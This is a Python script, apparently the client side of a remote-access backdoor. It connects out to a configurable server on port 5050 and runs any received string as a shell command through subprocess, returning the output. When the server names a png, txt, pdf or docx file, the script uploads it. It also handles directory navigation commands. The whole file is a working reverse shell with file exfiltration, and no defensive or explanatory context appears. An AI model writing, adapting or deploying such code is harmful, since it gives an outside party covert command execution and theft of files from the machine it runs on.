import socket
import os
import subprocess
port = 5050
disconnect = "quit"
size = 1024
format = "utf-8"
directory = "cd.."
directory2 = "cd "
directory3 = "cd\\"
directory4 = ":\\"
server_main = ""    # IPv4 Address of Remote Client
address = (server_main , port)
client = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
client.connect(address)
def send_picture(open_file):
    file_target = open(open_file , "rb")
    size_file = os.path.getsize(open_file)
    client.send(str(size_file).encode(format))
    data = file_target.read()
    client.sendall(data)
    client.send(b"<e>")
    file_target.close()
try:
    while True:
        acc = client.recv(size).decode(format)
        detect = acc[:3]
        detect2 = acc[:4]
        detect3 = acc[-2:]
        if acc == disconnect:
            break
        elif detect2 == directory: 
            cwd = os.getcwd()
            str1 = ""
            current_split = cwd.split("\\")
            for i , item in enumerate(current_split):
                if item == current_split[-1]:
                    continue
                str1 += current_split[i] + "\\"
            os.chdir(str1)
            client.send(("Directory changed").encode(format))
        elif detect == directory2:
            convert = acc[3:]
            os.chdir(convert)
            client.send(("Directory changed").encode(format))
        elif detect == directory3:
            cwd1 = os.getcwd()
            str2 = ""
            split_2 = cwd1.split("\\")
            for i , add in enumerate(split_2):
                if (i < 2):
                    str2 += add + "\\"
                else:
                    continue
            os.chdir(str2)
            client.send(("Directory changed").encode(format))
        elif detect3 == directory4:
            current = os.getcwd()
            split_ = current.split(" ")
            os.chdir(split_[1])
            client.send(("Directory changed").encode(format)) 
        elif (acc[-3:] == "png" or acc[-3:] == "txt" or acc[-3:] == "pdf" or acc[-4:] == "docx"):
            send_picture(acc)
        else:
            sub = subprocess.getoutput(acc)
            message = sub.encode(format)
            client.send(message)
    client.close()
except socket.error as e:
    print(f"Error Occured: {e}")
